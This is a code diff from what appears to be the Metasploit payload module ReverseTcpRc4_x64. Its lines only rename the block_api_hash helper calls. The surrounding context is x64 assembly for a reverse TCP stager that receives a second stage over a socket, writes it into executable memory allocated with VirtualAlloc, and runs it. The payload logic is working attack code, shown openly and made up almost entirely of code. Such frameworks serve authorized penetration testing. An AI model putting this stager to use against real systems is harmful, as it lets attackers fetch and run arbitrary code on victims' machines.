@@ -74,7 +74,7 @@ module Payload::Windows::ReverseTcpRc4_x64
         push 4                  ;
         pop r8                  ; length = sizeof( DWORD );
         mov rcx, rdi            ; the saved socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'recv')}
         call rbp                ; recv( s, &dwLength, 4, 0 );
     ^
 
@@ -101,7 +101,7 @@ module Payload::Windows::ReverseTcpRc4_x64
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly received second stage length.
         xor rcx,rcx             ; NULL as we dont care where the allocation is.
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         ; mov rbx, rax            ; rbx = our new memory address for the new stage
@@ -117,7 +117,7 @@ module Payload::Windows::ReverseTcpRc4_x64
         mov r8, rsi             ; length
         mov rdx, rbx            ; the current address into our second stages RWX buffer
         mov rcx, rdi            ; the saved socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'recv')}
         call rbp                ; recv( s, buffer, length, 0 );
         add rsp, 32             ; restore stack after api_call
     ^
@@ -137,14 +137,14 @@ module Payload::Windows::ReverseTcpRc4_x64
         pop r8                  ; dwFreeType
         push 0                  ; 0
         pop rdx                 ; dwSize
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualFree')}
         call rbp                ; VirtualFree(payload, 0, MEM_COMMIT)
 
       cleanup_socket:
       ; clean up the socket
         push rdi                ; socket handle
         pop rcx                 ; s (closesocket parameter)
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'closesocket')}
         call rbp
 
       ; and try again
